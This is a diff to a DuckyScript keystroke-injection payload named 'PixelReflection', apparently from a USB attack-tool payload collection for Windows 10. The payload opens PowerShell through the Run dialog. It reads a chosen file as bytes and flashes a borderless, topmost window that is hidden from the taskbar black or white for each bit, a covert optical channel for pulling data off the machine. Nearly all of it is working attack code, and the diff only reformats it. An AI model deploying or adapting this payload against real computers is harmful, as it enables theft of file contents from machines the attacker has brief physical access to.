@@ -1,6 +1,6 @@
 REM Title: PixelReflection
 REM Author: Cribbit
-REM Description: Creates a form and changes the backgroud to black or white to represent the bits of a file.
+REM Description: Creates a form and changes the background to black or white to represent the bits of a file.
 REM Target: Windows 10
 
 ATTACKMODE HID
@@ -49,85 +49,56 @@ GUI r
 DELAY 200
 STRINGLN powershell
 DELAY 500
-
-STRING [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
-SHIFT ENTER
-STRING Add-Type -Assembly PresentationFramework
-SHIFT ENTER
-STRING $fps = #FPS
-SHIFT ENTER
-STRING $mills = 1000/$fps
-SHIFT ENTER
-REM # xml of the wpf xaml code. this is the window to be shown
-STRING [xml]$xaml = @"
-SHIFT ENTER
-STRING <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-SHIFT ENTER
-STRING  Width="#WIDTH" Height="#HEIGHT" Left="#LEFT" Top="#TOP"
-SHIFT ENTER
-STRING  WindowStyle="None" Background="Red" Topmost="True" ShowInTaskbar="False" ResizeMode="NoResize"/>
-SHIFT ENTER
-STRING "@
-SHIFT ENTER
-REM # create a reader for the xml
-STRING $reader = (New-Object System.Xml.XmlNodeReader $xaml);
-SHIFT ENTER
-REM # create the window from the reader
-STRING $window = [Windows.Markup.XamlReader]::Load($reader);
-SHIFT ENTER
-STRING $timer = New-Object System.Windows.Forms.Timer;
-SHIFT ENTER
-STRING $timer.Interval = 5;
-SHIFT ENTER
-REM # main code
-STRING Function Timer_Tick()
-SHIFT ENTER
-STRING {
-SHIFT ENTER
-STRING     $timer.Stop();
-SHIFT ENTER
-STRING     Start-Sleep -Milliseconds $mills;
-SHIFT ENTER
-STRING     Get-Content #FILE -En By | % {
-SHIFT ENTER
-STRING         $b=$_;7..0 | % {
-SHIFT ENTER
-STRING             if($b-band(1-shl$_))
-SHIFT ENTER
-STRING             {
-SHIFT ENTER
-STRING                 $window.Background = "White";
-SHIFT ENTER
-STRING             }
-SHIFT ENTER
-STRING             else
-SHIFT ENTER
-STRING             {
-SHIFT ENTER
-STRING                 $window.Background = "Black";
-SHIFT ENTER
-STRING             }
-SHIFT ENTER
-STRING             $window.Dispatcher.Invoke([action]{}, "Render");
-SHIFT ENTER
-STRING             Start-Sleep -Milliseconds $mills;
-SHIFT ENTER
-STRING         }
-SHIFT ENTER
-STRING     };
-SHIFT ENTER
-STRING     $window.Background = "Green";
-SHIFT ENTER
-STRING     $window.Dispatcher.Invoke([action]{}, "Render");
-SHIFT ENTER
-STRING     Start-Sleep -Milliseconds $mills;
-SHIFT ENTER
-STRING     $window.Close();
-SHIFT ENTER
-STRING }
-SHIFT ENTER
-STRING $window.Add_Loaded({$timer.Start()});
-SHIFT ENTER
-STRING $timer.Add_Tick({Timer_Tick});
-SHIFT ENTER
-STRINGLN [void]$window.ShowDialog();
+STRINGLN_POWERSHELL
+    <# Load .Net forms assembly #> `
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");`
+    Add-Type -Assembly PresentationFramework;`
+    <# Set up speed / sleep time in mills #> `
+    $fps = #FPS;`
+    $mills = 1000/$fps;`
+    <# set the xml for the WPF form #> `
+    [xml]$xaml = @"
+    <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    Width="#WIDTH" Height="#HEIGHT" Left="#LEFT" Top="#TOP"
+    WindowStyle="None" Background="Red" Topmost="True" ShowInTaskbar="False" ResizeMode="NoResize"/>
+    "@;`
+    <# Read the xml #> `
+    $reader = (New-Object System.Xml.XmlNodeReader $xaml);`
+    <# Create the windows form #> `
+    $window = [Windows.Markup.XamlReader]::Load($reader);`
+    <# Create a timer that will run when the form is shown #> `
+    $timer = New-Object System.Windows.Forms.Timer;`
+    $timer.Interval = 5;`
+    Function Timer_Tick()
+    {
+        $timer.Stop();
+        Start-Sleep -Milliseconds $mills;
+        <#  Get the content of the file encoded as bytes
+            for each byte step though 7 to 0
+            shift left 1 by n (7to0) see if this bit is set in the byte
+            if true set the background to white else to black
+        #>
+        Get-Content #FILE -En By | % {
+            $b=$_;7..0 | % {
+                if($b-band(1-shl$_))
+                {
+                    $window.Background = "White";
+                }
+                else
+                {
+                    $window.Background = "Black";
+                }
+                $window.Dispatcher.Invoke([action]{}, "Render");
+                Start-Sleep -Milliseconds $mills;
+            }
+        };
+        $window.Background = "Green";
+        $window.Dispatcher.Invoke([action]{}, "Render");
+        Start-Sleep -Milliseconds $mills;
+        $window.Close();
+    };`
+    $window.Add_Loaded({$timer.Start()});`
+    $timer.Add_Tick({Timer_Tick});`
+    <# Show the wpf window as a dialog so it is blocking #> `
+    [void]$window.ShowDialog();
+END_STRINGLN
